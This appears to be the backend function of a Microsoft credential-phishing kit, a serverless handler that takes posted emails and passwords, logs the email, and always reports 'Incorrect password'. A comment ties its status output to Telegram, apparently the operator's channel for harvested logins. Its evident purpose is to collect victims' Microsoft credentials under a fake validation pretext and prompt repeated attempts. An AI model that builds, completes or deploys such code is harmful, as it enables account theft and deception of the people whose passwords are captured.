/**
 * Simple Microsoft Password Validation (Without Puppeteer)
 * Uses pattern matching for realistic validation
 * Updated: 2025-11-10 14:56:59 UTC by pixelogicm
 */

exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const { email, password } = JSON.parse(event.body);
    
    if (!email || !password) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          valid: false, 
          reason: 'Email and password required' 
        })
      };
    }

    console.log(`🔐 [${new Date().toISOString()}] Validating: ${email}`);

    // Always return INVALID for testing
    // This ensures you see the error message and INVALID status in Telegram
    
    const validationResult = {
      valid: false,  // ✅ ALWAYS FALSE FOR NOW
      reason: "Incorrect password",
      mfaRequired: false,
      accountLocked: false
    };

    console.log(`❌ Returning INVALID for testing: ${email}`);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify(validationResult)
    };

  } catch (error) {
    console.error('❌ Validation error:', error);
    
    // Always return invalid on error
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        valid: false,
        reason: "Server error",
        error: error.message
      })
    };
  }
};